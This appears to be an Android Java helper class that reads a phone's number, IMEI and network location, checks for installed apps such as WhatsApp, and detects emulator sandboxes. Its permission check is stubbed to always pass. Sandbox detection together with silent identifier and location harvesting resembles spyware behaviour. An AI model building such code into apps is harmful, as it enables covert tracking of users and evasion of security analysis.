package com.xpf.me.sms.routine;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.telephony.TelephonyManager;

/**
 * Created by xgo on 10/30/15.
 */
public class AndroidDeviceInfo {

    private Context context;

    public AndroidDeviceInfo(Context context) {
        this.context = context;
    }

    public String getPhoneNumber() {
        return ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
    }

    public String getImei() {
        return ((TelephonyManager) context
                .getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
    }

    private int checkSelfPermission(String per) {
        return 0;
    }

    public double getLatitude() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    public void requestPermissions(@NonNull String[] permissions, int requestCode)
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for Activity#requestPermissions for more details.
        }
        return ((LocationManager) context
                .getSystemService(Context.LOCATION_SERVICE))
                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                .getLatitude();
    }

    public double getLongitude() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    public void requestPermissions(@NonNull String[] permissions, int requestCode)
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for Activity#requestPermissions for more details.
        }
        return ((LocationManager) context
                .getSystemService(Context.LOCATION_SERVICE))
                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                .getLongitude();
    }

    /*
     * com.whatsapp : whatsapp
     */
    public boolean isPackageExist(String packageName) {
        try {
            context.getPackageManager().getApplicationInfo(packageName,
                    PackageManager.GET_META_DATA);
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
        return true;
    }

    /*
     * Running in SandBox ?
     */
    public boolean inSandBox() {
        if (((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE))
                .getNetworkOperatorName().equals("Android")
                || ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE))
                .getSimOperatorName().equals("Android")) {
            return true;
        }
        return false;
    }
}

